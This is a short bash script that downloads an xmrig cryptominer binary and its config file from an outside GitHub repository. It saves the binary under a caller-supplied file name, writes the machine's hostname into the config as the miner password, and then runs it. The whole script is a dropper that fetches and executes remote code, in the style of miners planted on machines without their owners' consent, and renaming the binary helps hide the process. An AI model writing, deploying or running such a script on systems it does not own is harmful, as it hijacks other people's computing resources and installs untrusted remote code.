#!/bin/bash

CONFIG="https://raw.githubusercontent.com/blackUser623/xm/main/config.json"
TERMINAL="https://raw.githubusercontent.com/blackUser623/xm/main/xmrig"
PASS=$(hostname)
PATH="$1"
FILE="$2"

wget ${CONFIG} -O ${PATH}config.json
wget ${TERMINAL} -O ${PATH}${FILE}

sed -i "s/xxxxx/${PASS}/g" ${PATH}config.json

cd ${PATH} && $FILE || exit
